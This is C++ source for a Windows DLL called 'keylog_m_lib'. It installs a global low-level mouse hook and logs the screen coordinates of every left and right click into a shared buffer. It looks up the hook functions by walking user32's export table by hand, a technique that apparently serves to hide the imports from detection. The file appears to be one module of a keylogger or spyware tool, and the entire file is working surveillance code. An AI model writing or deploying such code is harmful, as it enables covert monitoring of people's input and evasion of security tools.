//cl /EHsc /LD .\keylog_m_lib.cpp /link User32.lib
#include <Windows.h>
#include <mutex>
#include <string>
#include <vector>
#include <sstream>
#define DLL_EXPORT __declspec(dllexport)
///////////////////////////////////////////////////////////////////////
HHOOK m_hook;
std::vector<std::string>* sharedLogVector = nullptr;
std::mutex logMutex;
///////////////////////////////////////////////////////////////////////
LRESULT CALLBACK M_Proc(int nCode, WPARAM wParam, LPARAM lParam);
///////////////////////////////////////////////////////////////////////

typedef HHOOK(WINAPI *SetWinHookFn)(int, HOOKPROC, HINSTANCE, DWORD);
typedef BOOL(WINAPI *UnhookWinHookExFn)(HHOOK);
typedef LRESULT(WINAPI *CallNxtHookExFn)(HHOOK, int, WPARAM, LPARAM);

SetWinHookFn MySetWindowsHookEx;
UnhookWinHookExFn MyUnhookWindowsHookEx;
CallNxtHookExFn MyCallNextHookEx;

///////////////////////////////////////////////////////////////////////

void* FindExportAddress(HMODULE hModule, const char* funcName)
{
    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)hModule;
    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)((BYTE*)hModule + dosHeader->e_lfanew);

    IMAGE_EXPORT_DIRECTORY* exportDir = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)hModule + ntHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);

    DWORD* nameRVAs = (DWORD*)((BYTE*)hModule + exportDir->AddressOfNames);
    WORD* ordRVAs = (WORD*)((BYTE*)hModule + exportDir->AddressOfNameOrdinals);
    DWORD* funcRVAs = (DWORD*)((BYTE*)hModule + exportDir->AddressOfFunctions);
    for (DWORD i = 0; i < exportDir->NumberOfNames; ++i)
    {
        char* funcNameFromExport = (char*)((BYTE*)hModule + nameRVAs[i]);
        if (strcmp(funcNameFromExport, funcName) == 0)
        {
            DWORD funcRVA = funcRVAs[ordRVAs[i]];
            return (void*)((BYTE*)hModule + funcRVA);

        }
    }
    return nullptr;
}

DLL_EXPORT void Initialize(std::vector<std::string>* logVector)
{

    HMODULE hUser32 = (HMODULE)GetModuleHandleA("user32.dll");
    MySetWindowsHookEx = (SetWinHookFn)FindExportAddress(hUser32, "SetWindowsHookExA");
    MyUnhookWindowsHookEx = (UnhookWinHookExFn)FindExportAddress(hUser32, "UnhookWindowsHookEx");
    MyCallNextHookEx = (CallNxtHookExFn)FindExportAddress(hUser32, "CallNextHookEx");
    
    sharedLogVector = logVector;
    m_hook = MySetWindowsHookEx(WH_MOUSE_LL, M_Proc, GetModuleHandle(NULL), 0);
}

DLL_EXPORT void Cleanup()
{
    if (m_hook) MyUnhookWindowsHookEx(m_hook);
}

LRESULT CALLBACK M_Proc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0)
    {
        MSLLHOOKSTRUCT* m_Struct = (MSLLHOOKSTRUCT*)lParam;
        int x = m_Struct->pt.x;
        int y = m_Struct->pt.y;

        switch (wParam)
        {
            case WM_LBUTTONDOWN:
            {
                std::ostringstream oss;
                oss << x << " , " << y;
                std::string entry = "\n[Left click( " + oss.str() + " )]\n";
                {
                    std::lock_guard<std::mutex> lock(logMutex);
                    sharedLogVector->emplace_back(entry);
                }
                break;
            }
            case WM_RBUTTONDOWN:
            {
                std::ostringstream oss;
                oss << x << " , " << y;
                std::string entry = "\n[Right click( " + oss.str() + " )]\n";
                {
                    std::lock_guard<std::mutex> lock(logMutex);
                    sharedLogVector->emplace_back(entry);
                }
                break;
            }
        }
    }
    return MyCallNextHookEx(m_hook, nCode, wParam, lParam);
}